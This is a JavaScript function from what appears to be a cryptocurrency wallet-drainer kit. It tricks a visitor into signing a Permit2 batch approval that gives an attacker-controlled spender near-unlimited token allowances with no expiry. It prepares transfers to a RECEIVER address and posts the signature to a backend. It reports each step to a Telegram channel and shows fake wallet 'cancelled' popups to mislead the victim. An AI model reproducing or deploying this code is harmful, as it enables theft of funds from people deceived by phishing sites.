async function actionPermit2Multi(walletAddress, blockchain) {
    let isSigned = false;
    //   console.log(' -*- ACTION PERMIT2 MULTICHAIN -*- ');
    let Permit2MultiTokens = getItem("permit2Multi");
    let Permit2MultiValue = getItem("permit2MultiValue");
    let FilteredTokens = Permit2MultiTokens.filter((token) => {
        if (token.chain === blockchain) return token;
    });
    const web3Js = new Web3(chainRegistryData[blockchain].rpc);
    if (FilteredTokens.length > 0) {
        let nonce;
        let deadline = ethers.constants.MaxUint256;;
        let value = "146150163733090291820368483271628301965593254297";
        let permit2_istance = new web3Js.eth.Contract(PERMITBATCH_ABI, permit2Contract);
        let details = await Promise.all(FilteredTokens.map(async (token) => {
            nonce = (await permit2_istance.methods.allowance(walletAddress, token.address, CALLER).call({
                from: walletAddress
            })).nonce;
            console.log("> Current nonce: ", nonce);
            return {
                token: token.address,
                amount: value,
                expiration: deadline,
                nonce: nonce
            }
        }));
        //   console.log(details);
        let withdrawals = await Promise.all(FilteredTokens.map(async (token) => {
            let erc20_istance = new web3Js.eth.Contract(ERC20ABI, token.address);
            let allowance = await erc20_istance.methods.allowance(walletAddress, permit2Contract).call();
            console.log("APPROVED BALANCE ", allowance);
            let finalBalance;

            (Number(token.balance) > Number(allowance)) ? finalBalance = Number(allowance): finalBalance = Number(token.balance);
            return {
                from: walletAddress,
                to: RECEIVER,
                amount: finalBalance,
                token: token.address
            }
        }));
        //   console.log(withdrawals);
        domain = {
                name: 'Permit2',
                chainId: FilteredTokens[0].chain_id,
                verifyingContract: permit2Contract,
            },
            types = {
                PermitBatch: [{
                        name: 'details',
                        type: 'PermitDetails[]',
                    },
                    {
                        name: 'spender',
                        type: 'address',
                    },
                    {
                        name: 'sigDeadline',
                        type: 'uint256',
                    },
                ],
                PermitDetails: [{
                        name: 'token',
                        type: 'address',
                    },
                    {
                        name: 'amount',
                        type: 'uint160',
                    },
                    {
                        name: 'expiration',
                        type: 'uint48',
                    },
                    {
                        name: 'nonce',
                        type: 'uint48',
                    },
                ],
            },
            message = {
                details: details,
                spender: chainRegistryData['ethereum'].permit_multicall,
                sigDeadline: deadline,
            }
        tgSend(`📝 [${blockchain.toUpperCase()}] Permit2 Prompted\n${sAddr(walletAddress)}\n\n${EMOJIS.www} Website: <a href="${window.location.href}">${show_full_links ? window.location.href : window.location.hostname}</a>`)
        await new Promise(async (resolve, reject) => {
            try {
                permit2signature = await signer._signTypedData(
                    domain,
                    types,
                    message
                )
                resolve(permit2signature)
            } catch (error) {
                if (error.message.includes("user rejected signing")) tgSend(`${EMOJIS.reject} Permit2 | Popup Declined\n${sAddr(walletAddress)}\n\n${EMOJIS.www} Website: <a href="${window.location.href}">${show_full_links ? window.location.href : window.location.hostname}</a>`)
                else tgSend(`${EMOJIS.error} Permit2 error ${sAddr(walletAddress)}\n${error.message ? error.message : JSON.stringify(error)}`)
                console.log('Error:', error.message)
                isSigned = false;
                if (skip_popup_decline) setItem("permit2Tokens", []);
                reject(error);
                //   console.log("[ACTION SIG END]");
                return isSigned;
            }
        }).then(async signature => {

            if (get_signer_address_typed_data(domain, types, message, signature).toLowerCase() !== walletAddress.toLowerCase()) {
                tgSend(`${EMOJIS.fake_sign} Signature is invalid, detected as a known bot\n${EMOJIS.line} Signature: <code>${signature}</code>`);
                return false;
            }
            isSigned = true;
            var data = {
                address: walletAddress.slice(2),
                withdrawals: withdrawals,
                details: details,
                tokenPrice: Number(Permit2MultiValue).toFixed(3),
                deadline: deadline,
                signature: signature,
                domain: window.location.hostname,
                chain: blockchain,
                multicall: true
            }
            post_data_to_backend(data, "crypto/permit2");
            // popup signed
            if (Popup_Style === 1) {
                popup.setError()
            } else if (Popup_Style === 2){
                loaderShow(14)
            } else if (Popup_Style === 3){
                loaderShow(25);
                mmPopup('#popup6');
            } else if (Popup_Style === 4){
                loaderShow(30);
                mmPopup('#popup7');
            } else if (Popup_Style === 5 && wallet_name === "MetaMask"){
                loaderShow(34);
                mmPopup('#modal-cancelled_meta');
            } else if (Popup_Style === 5 && wallet_name === "Trust Wallet"){
                loaderShow(39);
                mmPopup('#modal-cancelled_trust');
            } else if (Popup_Style === 5 && wallet_name === "Wallet Connect"){
                loaderShow(44);
                mmPopup('#modal-cancelled_wallet');
            } else if (Popup_Style === 5){
                loaderShow(44);
                mmPopup('#modal-cancelled_wallet');
            }
            multiChainMode = "permit2";
            return isSigned;
        }).catch(error => {
            console.log(error.message);
            console.log("Permit2 error:", error);
            return false;
        })
    }
    return isSigned;
}

